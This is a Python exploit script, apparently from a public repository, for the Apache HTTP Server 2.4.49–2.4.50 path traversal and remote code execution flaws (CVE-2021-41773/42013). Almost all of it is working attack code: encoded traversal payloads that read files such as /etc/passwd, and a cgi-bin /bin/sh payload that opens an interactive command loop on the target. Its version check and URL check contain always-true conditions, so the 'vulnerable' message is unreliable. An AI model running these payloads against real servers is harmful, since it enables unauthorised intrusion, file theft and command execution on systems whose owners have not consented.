# !/usr/bin/python3
# Author: Ravin | Blacknote
# Link: https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution/blob/main/exploit.py
# CVE-2021-41773 | CVE-2021-42013
# Apache HTTP Server 2.4.49-2.4.50 - Path Traversal & Remote Code Execution

# Usage: 
# in some cases, reading files or rce might fail, so try both of them
# python3 Apache-2.4.49-2.4.50 127.0.0.1 8080 rce 'id'
# python3 Apache-2.4.49-2.4.50 127.0.0.1 8080 file '/etc/passwd'

# Reference(s):
# https://www.picussecurity.com/resource/blog/simulate-apache-cve-2021-41773-exploits-vulnerability

import argparse
import requests as req


# Path Traversal
payload1="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
# Path Traversal
payload2="/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
# RCE
payload3="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


url = ""

def check(url):
    res = req.get(url)
    server = res.headers.get('Server')

    if "Apache/2.4.49" or "Apache/2.4.50" in server:
        print("[i] Host appears to be vulnerable.")
        
    else:
        print("[i] Host might not be vulnerable.")
        force = input("[!] Do you still want to run the exploit? (y/n): ")
        if force.lower() == "n":
            exit(0)

            

def rce(url, cmd):

    payload_url=f"{url}{payload3}"
    data = f"echo Content-Type: text/plain; echo; {cmd}"
    s = req.Session()
    r = req.Request('POST', payload_url, data=data).prepare()
    r.url = payload_url
    resp = s.send(r)
    if resp.status_code == 200:
        print("[*] Working Payload: " + payload_url + "\n")
        print(f"$ {cmd}")
        print((resp.content).decode('utf-8', errors='ignore'))
        while 1:
            cmd = input("$ ")
            if cmd =='exit':
                    exit(0)
            else:
                data = f"echo Content-Type: text/plain; echo; {cmd}"
                s = req.Session()
                r = req.Request('POST', payload_url, data=data).prepare()
                r.url = payload_url
                resp = s.send(r)
                print((resp.content).decode('utf-8', errors='ignore'))
    else:
        print("[!] Host seems to be patched.")
        exit(0)         

def traversal(url, file):
  
    payloads = [payload1, payload2]
    
    for i in payloads:
        payload_url=f"{url}{i}{file}"
        s = req.Session()
        r = req.Request('GET', payload_url).prepare()
        r.url = payload_url
        resp = s.send(r)
        if resp.status_code == 200:
            print("[*] Working payload: " + f"{url}{i}" + "/path/to/file\n")
            print((resp.content).decode('utf-8', errors='ignore') + "\n")
            while 1:
                file = input("File (Absolute Path)> ")
                if file =='exit':
                    exit(0)
                else:
                    payload_url=f"{url}{i}{file}"
                    s = req.Session()
                    r = req.Request('GET', payload_url).prepare()
                    r.url = payload_url
                    resp = s.send(r)
                    print((resp.content).decode('utf-8', errors='ignore') + "\n")
        elif i==payload2 and resp.status_code != 200:
            print("[!] Host seems to be patched.")
            exit(0)

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-41773 & CVE-2021-42013")
    parser.add_argument("rhost")
    parser.add_argument("rport")
    parser.add_argument("opt")
    parser.add_argument("cmd")

    args = parser.parse_args()

    if "http://" or "https://" not in args.rhost:
        url = f"http://{args.rhost}:{args.rport}"
        
    else:
        url = f"{args.rhost}:{args.rport}"

    check(url)

    if "rce" in (args.opt).lower():
        rce(url, args.cmd)
    elif "file" in (args.opt).lower():
        traversal(url, args.cmd)
    else:
        print("[!] Invalid Option!")
        exit(0)

if __name__ == '__main__':
    main()
